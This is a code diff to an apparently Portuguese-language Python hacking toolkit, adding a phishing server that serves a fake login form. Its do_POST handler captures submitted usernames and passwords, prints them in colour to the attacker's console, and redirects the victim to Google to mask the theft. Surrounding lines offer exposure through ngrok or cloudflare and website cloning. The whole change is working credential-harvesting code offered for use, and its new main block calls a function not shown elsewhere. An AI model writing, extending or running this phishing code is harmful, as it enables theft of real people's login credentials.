@@ -294,9 +294,47 @@ def run_local_server(language):
         print("Executando site de phishing em localhost...")
 
     # Configurar o servidor HTTP local para servir os arquivos clonados
-    class PhishingServer(http.server.SimpleHTTPRequestHandler):
-        def __init__(self, *args, **kwargs):
-            super().__init__(*args, directory='./')  # Diretório onde os arquivos estão salvos
+    class PhishingServer(http.server.BaseHTTPRequestHandler):
+        def do_GET(self):
+            # Exibir o formulário clonado no console
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+            html = """
+            <html>
+            <head><title>Login</title></head>
+            <body>
+            <form method="post">
+            Username: <input type="text" name="username"><br>
+            Password: <input type="password" name="password"><br>
+            <input type="submit" value="Submit">
+            </form>
+            </body>
+            </html>
+            """
+            self.wfile.write(html.encode('utf-8'))
+
+        def do_POST(self):
+            # Capturar dados do formulário POST
+            content_length = int(self.headers['Content-Length'])
+            post_data = self.rfile.read(content_length).decode('utf-8')
+            username = post_data.split('&')[0].split('=')[1]
+            password = post_data.split('&')[1].split('=')[1]
+
+            # Exibir credenciais no console
+            if language == '1':
+                print(Fore.GREEN + Style.BRIGHT + "Credentials entered:".center(50))
+                print(f"Username: {username}")
+                print(f"Password: {password}")
+            else:
+                print(Fore.GREEN + Style.BRIGHT + "Credenciais inseridas:".center(50))
+                print(f"Nome de Usuário: {username}")
+                print(f"Senha: {password}")
+
+            # Redirecionar para uma página real após capturar as credenciais
+            self.send_response(302)
+            self.send_header('Location', 'https://www.google.com')
+            self.end_headers()
 
     try:
         # Iniciar o servidor em uma thread separada
@@ -343,6 +381,14 @@ def phishing(language):
         server_choice = input("Escolha o servidor a ser usado (1: localhost, 2: ngrok, 3: cloudflare): ")
 
     clone_website(url, server_choice, language)
+
+# Inicialização do programa
+if __name__ == "__main__":
+    init(autoreset=True)  # Inicialização do colorama
+    language = input("Choose language / Escolha o idioma:\n1. English\n2. Português\n\nChoice / Escolha: ")
+
+    # Simulando a execução do programa com a opção 2 selecionada
+    fake_login_pages(language)
 
 # Função para informações de número de telefone
 def phone_number_info(language):
